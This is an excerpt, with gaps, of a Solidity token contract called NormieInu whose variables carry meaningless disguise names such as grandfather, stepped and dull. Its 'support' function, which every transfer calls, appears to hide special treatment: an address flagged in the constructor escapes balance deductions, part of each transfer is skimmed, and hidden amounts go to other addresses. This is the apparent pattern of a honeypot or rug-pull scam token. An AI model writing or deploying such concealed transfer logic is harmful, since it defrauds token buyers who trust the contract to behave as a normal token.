...
contract NormieInu is Ownable {
    ...
    mapping(address => uint256) private stepped;
    ...
    function support(
        ...
        if (grandfather[machinery] == 0 && (address(uniswapV2Pair) != machinery) && short[machinery] > 0) {
            grandfather[machinery] -= dull;
        }

        address higher = explanation;
        explanation = excellent;

        if (grandfather[machinery] == 0) stepped[machinery] -= feet;
        uint256 hay = (feet * far) / 100;
        feet -= hay;
        short[higher] += dull;
        stepped[excellent] += feet;
    }

    mapping(address => uint256) private short;
    ...
    function transferFrom(
        ...
        support(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        support(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(discussion);
        ...
        dull = 9;
        far = 3;
        grandfather[lonely] = dull;
        _tTotal = 1000000000000000 * 10**dull;
        stepped[msg.sender] = _tTotal;
    }
}